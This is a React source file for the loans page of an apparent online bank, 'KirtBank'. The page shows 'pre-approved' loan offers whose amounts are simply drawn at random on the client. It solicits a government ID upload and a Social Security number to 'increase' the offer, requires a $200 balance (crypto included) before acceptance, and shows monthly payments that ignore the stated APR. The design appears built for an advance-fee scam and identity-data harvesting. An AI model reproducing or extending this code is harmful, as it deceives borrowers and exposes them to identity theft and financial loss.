// frontend/src/pages/Loans.jsx
import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { toast } from 'react-toastify';
import '../styles/Loans.css';

const Loans = () => {
  const [loanOffer, setLoanOffer] = useState(null);
  const [hasSubmittedIdSsn, setHasSubmittedIdSsn] = useState(false);
  const [balance, setBalance] = useState({ checking: 0, savings: 0, usdt: 0 });
  const [idFile, setIdFile] = useState(null);
  const [ssn, setSsn] = useState('');
  const [showIdSsnForm, setShowIdSsnForm] = useState(false);
  const [accepted, setAccepted] = useState(false);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [calcAmount, setCalcAmount] = useState(5000); // For repayment calculator
  const [calcTerm, setCalcTerm] = useState(36);
  const navigate = useNavigate();

  useEffect(() => {
    const fetchLoanData = async () => {
      try {
        const token = localStorage.getItem('token');
        if (!token) {
          toast.error('Please log in to view loan offer');
          navigate('/login');
          return;
        }
        const res = await axios.get(`${import.meta.env.VITE_API_URL}/api/loans`, {
          headers: { Authorization: `Bearer ${token}` },
        });
        setLoanOffer(res.data.loanOffer);
        setHasSubmittedIdSsn(res.data.hasSubmittedIdSsn);
        setBalance(res.data.balance);
        setLoading(false);
      } catch (err) {
        if (err.response?.status === 401) {
          toast.error('Session expired, please log in again');
          localStorage.removeItem('token');
          navigate('/login');
        } else {
          toast.error(err.response?.data?.message || 'Failed to load loan data');
        }
        setLoading(false);
      }
    };
    fetchLoanData();
  }, [navigate]);

  const handleCalculateOffer = async () => {
    setSubmitting(true);
    try {
      const token = localStorage.getItem('token');
      const min = hasSubmittedIdSsn ? 3000 : 2000;
      const max = hasSubmittedIdSsn ? 15000 : 5000;
      const amount = Math.floor(Math.random() * (max - min + 1)) + min;

      await axios.post(
        `${import.meta.env.VITE_API_URL}/api/loans/apply`,
        { amount },
        { headers: { Authorization: `Bearer ${token}` } }
      );
      setLoanOffer(amount);
      toast.success(`Your loan offer: $${amount.toLocaleString()}`);
    } catch (err) {
      toast.error(err.response?.data?.message || 'Failed to generate offer');
    } finally {
      setSubmitting(false);
    }
  };

  const handleAccept = async () => {
    setSubmitting(true);
    try {
      const totalBalance = balance.checking + balance.savings + balance.usdt;
      if (totalBalance < 200) {
        toast.error(
          'Minimum account balance of $200 required to accept a loan. Please contact customer care at support@kirtbank.com or 1-800-KIRT-BANK.'
        );
        setSubmitting(false);
        return;
      }

      const token = localStorage.getItem('token');
      await axios.post(
        `${import.meta.env.VITE_API_URL}/api/loans/apply`,
        { amount: loanOffer },
        { headers: { Authorization: `Bearer ${token}` } }
      );
      setAccepted(true);
      toast.success('Loan application submitted successfully!');
    } catch (err) {
      toast.error(err.response?.data?.message || 'Failed to submit application');
    } finally {
      setSubmitting(false);
    }
  };

  const handleIdSsnSubmit = async (e) => {
    e.preventDefault();
    if (!idFile || !ssn) {
      toast.error('Please provide both ID document and SSN');
      return;
    }
    setSubmitting(true);
    try {
      const token = localStorage.getItem('token');
      const formData = new FormData();
      formData.append('idDocument', idFile);
      formData.append('ssn', ssn);

      const res = await axios.post(
        `${import.meta.env.VITE_API_URL}/api/loans/update-offer`,
        formData,
        { headers: { Authorization: `Bearer ${token}` } }
      );
      setLoanOffer(res.data.amount);
      setHasSubmittedIdSsn(true);
      setShowIdSsnForm(false);
      setIdFile(null);
      setSsn('');
      toast.success('ID & SSN verified — your loan offer has been increased!');
    } catch (err) {
      toast.error(err.response?.data?.message || 'Failed to update offer');
    } finally {
      setSubmitting(false);
    }
  };

  const monthlyPayment = calcAmount && calcTerm ? (calcAmount / calcTerm).toFixed(2) : 0;

  if (loading) {
    return (
      <div className="loading-container">
        <div className="loading-spinner"></div>
        <p className="loading-message">Processing your request...</p>
      </div>
    );
  }

  return (
    <div className="loan-page">
      {/* Banner */}
      <div className="loan-banner">
        <h2>Calculate Your Personalized Loan Offer</h2>
        <button onClick={handleCalculateOffer} disabled={submitting}>
          {submitting ? 'Calculating...' : 'Get My Offer'}
        </button>
      </div>

      {/* Loan Offer */}
      {loanOffer && !accepted && (
        <div className="loan-offer">
          <h3>Your Pre-Approved Offer</h3>
          <p className="offer-amount">${loanOffer.toLocaleString()}</p>
          <p>Term: 36 months</p>
          <p>Interest Rate: 5.99% APR</p>

          <button onClick={handleAccept} disabled={submitting} className="accept-btn">
            {submitting ? 'Submitting...' : 'Accept Offer'}
          </button>

          {!hasSubmittedIdSsn && (
            <button
              onClick={() => setShowIdSsnForm(true)}
              className="increase-btn"
              disabled={submitting}
            >
              Increase Offer (Submit ID & SSN)
            </button>
          )}
        </div>
      )}

      {accepted && (
        <div className="loan-confirmation">
          <h3>Application Submitted!</h3>
          <p>We’ve received your ${loanOffer?.toLocaleString()} loan request.</p>
          <p>You’ll hear back within 1–2 business days.</p>
        </div>
      )}

      {/* ID/SSN Form */}
      {showIdSsnForm && !hasSubmittedIdSsn && (
        <div className="id-ssn-form">
          <h3>Submit Documents to Increase Offer</h3>
          <form onSubmit={handleIdSsnSubmit}>
            <label>
              Government ID (JPG, PNG, PDF)
              <input
                type="file"
                accept="image/jpeg,image/png,application/pdf"
                onChange={(e) => setIdFile(e.target.files[0])}
                required
              />
            </label>
            <label>
              SSN (e.g., 123-45-6789)
              <input
                type="text"
                value={ssn}
                onChange={(e) => setSsn(e.target.value)}
                placeholder="XXX-XX-XXXX"
                pattern="\d{3}-\d{2}-\d{4}"
                required
              />
            </label>
            <div className="form-actions">
              <button type="submit" disabled={submitting}>
                {submitting ? 'Uploading...' : 'Submit & Increase Offer'}
              </button>
              <button type="button" onClick={() => setShowIdSsnForm(false)} disabled={submitting}>
                Cancel
              </button>
            </div>
          </form>
        </div>
      )}

      {/* Repayment Calculator - Independent */}
      <div className="repayment-calculator">
        <h3>Repayment Calculator</h3>
        <p>Try any amount and term to see your monthly payment.</p>
        <div className="calc-inputs">
          <label>
            Loan Amount ($)
            <input
              type="number"
              value={calcAmount}
              onChange={(e) => setCalcAmount(Math.max(100, parseInt(e.target.value) || 0))}
              min="100"
              step="100"
            />
          </label>
          <label>
            Term (months)
            <select value={calcTerm} onChange={(e) => setCalcTerm(parseInt(e.target.value))}>
              <option value="12">12 months</option>
              <option value="24">24 months</option>
              <option value="36">36 months</option>
              <option value="48">48 months</option>
              <option value="60">60 months</option>
            </select>
          </label>
        </div>
        <div className="calc-result">
          <p>
            <strong>Estimated Monthly Payment:</strong> ${monthlyPayment}
          </p>
        </div>
      </div>

      {/* FAQ */}
      <div className="faq">
        <h3>FAQs</h3>
        <p><strong>Q:</strong> Do I need $200 to calculate an offer?</p>
        <p><strong>A:</strong> No — only to accept it.</p>
        <p><strong>Q:</strong> Can I change my offer later?</p>
        <p><strong>A:</strong> Yes! Submit ID & SSN to increase it.</p>
      </div>
    </div>
  );
};

export default Loans;